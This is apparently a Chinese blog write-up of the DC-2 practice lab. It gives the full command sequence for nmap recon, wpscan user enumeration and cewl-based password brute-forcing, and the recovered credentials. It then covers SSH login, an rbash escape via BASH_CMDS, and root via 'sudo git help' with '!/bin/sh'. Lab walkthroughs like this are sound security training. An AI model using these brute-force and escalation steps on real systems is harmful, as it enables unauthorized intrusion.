---
title: DC-2
date: 2024-11-28 22:46:20
tags: web
categories: 渗透测试
crated: 2026-01-20T15:50
updated: 2026-01-20T15:39
---

# DC-2
今天无所事事，又来搞靶机了，少搞这个，打算搞完DC系列再去加深学习一下，该学习学习eviden师傅的fofa教程了

本机ip ： 192.168.56.135
目标ip ： 192.168.56.147

## 信息收集
nmap扫描本地ip，主机发现 -sP，是用于内网主机探测
>nmap -sP 192.168.56.135/24
![](https://gitee.com/fogpost/photo/raw/master/202411282257172.png)
端口扫描
>nmap -A -p- 192.168.56.147
对靶机ip的全端口详细扫描，发现两个应用分别是80和7744端口，http和ssh
![](https://gitee.com/fogpost/photo/raw/master/202411282301709.png)

## 渗透测试
### 修改hosts
访问对应的web站点，发现了域名跳转，需要我们更改hosts文件，将域名指向靶机ip
![](https://gitee.com/fogpost/photo/raw/master/202411282305798.png)
>vim /etc/hosts
![](https://gitee.com/fogpost/photo/raw/master/202411282308689.png)
再次访问，进入主页面，发现flag，让我们爆破账户
![](https://gitee.com/fogpost/photo/raw/master/202411282309300.png)
![](https://gitee.com/fogpost/photo/raw/master/202411282311344.png)
### wpscan爆破账户
登录网站后进行指纹识别，可以用whatweb或者wapper
，发现是由wordpress搭建的
>whatweb 192.168.56.147 
![](https://gitee.com/fogpost/photo/raw/master/202411282312143.png)
进行目录扫描，查找管理员页面,发现后台管理页面
>dirb http://dc-2/ 
![](https://gitee.com/fogpost/photo/raw/master/202411282314018.png)
似乎有个专门的wordpress工具wpscan，使用wpscan进行扫描,常用语句：
>wpscan --url http://dc-2  扫描版本
wpscan --url http://dc-2 --enumerate t 扫描主题  
wpscan --url http://dc-2 --enumerate p 扫描插件  
wpscan --url http://dc-2 --enumerate u 枚举用户  

扫描版本发现版本为4.7.10，并利用wpscan枚举用户
![](https://gitee.com/fogpost/photo/raw/master/202411282322816.png)
发现三个用户admin，jerry，tom
![](https://gitee.com/fogpost/photo/raw/master/202411282324996.png)
根据flag1用cewl来生成字典，并进行爆破
>cewl http://dc-2/ > 1.txt  生成字典
 Cewl（Custom Word List Generator）是一个用 Ruby 编写的应用程序，它可以爬取指定 URL 的内容，并根据用户设定的参数和选项，生成自定义的字典文件。这些字典文件可以用于密码猜测、暴力破解等攻击场景，从而提高渗透测试的成功率

>wpscan --url http://dc-2 --passwords 1.txt 爆破密码，发现jerry和tom的密码  

jerry/adipiscing  
tom/parturient  

![](https://gitee.com/fogpost/photo/raw/master/202411282328174.png)

尝试用jerry登录，发现flag2，并提示我们使用ssh登录
![](https://gitee.com/fogpost/photo/raw/master/202411282330516.png)
![](https://gitee.com/fogpost/photo/raw/master/202411282330233.png)

### ssh登录
>ssh tom@192.168.56.147 -p 7744
![](https://gitee.com/fogpost/photo/raw/master/202411282333534.png)
成功登录，发现在本地有flag3，但是只有vi可用，这个叫我们提权
![](https://gitee.com/fogpost/photo/raw/master/202411282335807.png)

### rbash提权
查看当前权限的软件

![](https://gitee.com/fogpost/photo/raw/master/202411282337342.png)

利用echo来绕过rbash
>拿到jerry用户权限
export -p     //查看环境变量
BASH_CMDS[a]=/bin/sh;a     //把/bin/sh给a
/bin/bash
export PATH=$PATH:/bin/     //添加环境变量
export PATH=$PATH:/usr/bin    //添加环境变量

![](https://gitee.com/fogpost/photo/raw/master/202411282345295.png)

查看可以使用root权限的命令
>find / -user root -perm -4000 -print 2>/dev/null

![](https://gitee.com/fogpost/photo/raw/master/202411282354377.png)

>su jerry 利用su获取jerry的权限，这时密码就可以用了
现在就可以越权查看jerry的falg4，提示我们用git提权

![](https://gitee.com/fogpost/photo/raw/master/202411282341436.png)

>sudo -l 发现可以用git软件

![](https://gitee.com/fogpost/photo/raw/master/202411282351395.png)

>sudo git help status 

查看git的命令,在配置页面的命令行输入
!/bin/sh,即可提权
![](https://gitee.com/fogpost/photo/raw/master/202411282357480.png)
![](https://gitee.com/fogpost/photo/raw/master/202411282359962.png)


##总结
至此已经完成，知识点有比如wpscan的用法，git的提权，rbash的绕过






